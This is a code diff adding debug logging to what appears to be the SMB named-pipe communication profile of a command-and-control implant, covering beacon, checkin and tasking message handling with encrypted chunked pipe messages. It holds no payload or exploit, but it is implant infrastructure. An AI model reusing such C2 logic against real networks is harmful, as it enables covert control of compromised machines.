@@ -93,6 +93,7 @@ namespace Agent.Profiles
                 }
                 catch (Exception e)
                 {
+                    logger.Log(e.ToString());
                     this.currentAttempt++;
                 }
 
@@ -106,12 +107,12 @@ namespace Agent.Profiles
         {
             if (!connected)
             {
+                logger.Log($"Not connected, waiting for connection to pipe.");
                 onClientConnectedSignal.WaitOne();
             }
 
             try
             {
-                logger.Log(json);
                 json = this.crypt.Encrypt(json);
                 SmbMessage sm = new SmbMessage()
                 {
@@ -130,6 +131,8 @@ namespace Agent.Profiles
                     {
                         sm.final = true;
                     }
+                    logger.Log($"Sending message to pipe: {part.Length} bytes. (Final = {sm.final})");
+
                     await this.serverPipe.WriteAsync(sm);
                 }
 
@@ -145,7 +148,7 @@ namespace Agent.Profiles
         public bool StopBeacon()
         {
             this.cancellationTokenSource.Cancel();
-
+            logger.Log($"Beacon stopped..");
             return true;
         }
 
@@ -178,6 +181,7 @@ namespace Agent.Profiles
 
         private async Task OnMessageReceive(ConnectionMessageEventArgs<SmbMessage> args)
         {
+            logger.Log($"Message received from pipe.");
             //Event handler for new messages
             try
             {
@@ -192,6 +196,7 @@ namespace Agent.Profiles
 
                 if (args.Message.final)
                 {
+                    logger.Log($"Message was the last one.");
                     this.OnMessageReceiveComplete(this.partialMessages[args.Message.guid].ToString());
                     this.partialMessages.TryRemove(args.Message.guid, out _);
                 }
@@ -206,6 +211,7 @@ namespace Agent.Profiles
 
         private async Task OnClientConnection()
         {
+            logger.Log($"Client connected to pipe.");
             onClientConnectedSignal.Set();
             this.connected = true;
             await this.SendUpdate();
@@ -213,6 +219,7 @@ namespace Agent.Profiles
 
         private async Task OnClientDisconnect()
         {
+            logger.Log($"Client disconnected from pipe.");
             this.connected = false;
             onClientConnectedSignal.Reset();
             this.partialMessages.Clear();
@@ -223,6 +230,7 @@ namespace Agent.Profiles
             //If we haven't checked in yet, the only message this can really be is a checkin.
             if (!checkedin)
             {
+                logger.Log($"Handling checkin message");
                 cir = JsonSerializer.Deserialize(this.crypt.Decrypt(message), CheckinResponseJsonContext.Default.CheckinResponse);
                 checkinAvailable.Set();
                 return;
@@ -230,6 +238,7 @@ namespace Agent.Profiles
 
             //If we make it to here, it's a tasking response
             GetTaskingResponse gtr = JsonSerializer.Deserialize(message, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
+            logger.Log($"Handling get tasking.");
             if (gtr == null)
             {
                 return;
